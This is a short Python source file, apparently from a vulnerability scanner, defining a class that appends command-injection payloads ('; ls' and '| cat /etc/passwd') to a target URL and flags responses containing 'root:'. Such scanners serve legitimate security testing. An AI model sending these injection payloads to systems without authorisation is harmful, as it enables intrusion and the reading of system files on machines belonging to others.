# scanner/command_injection.py
import requests

class CommandInjectionScanner:
    def __init__(self, target_url):
        self.target_url = target_url

    def scan(self):
        print(f"Scanning {self.target_url} for command injection vulnerabilities...")
        payloads = ["; ls", "| cat /etc/passwd"]
        for payload in payloads:
            response = requests.get(self.target_url + payload)
            if "root:" in response.text:
                print(f"Potential command injection vulnerability found with payload: {payload}")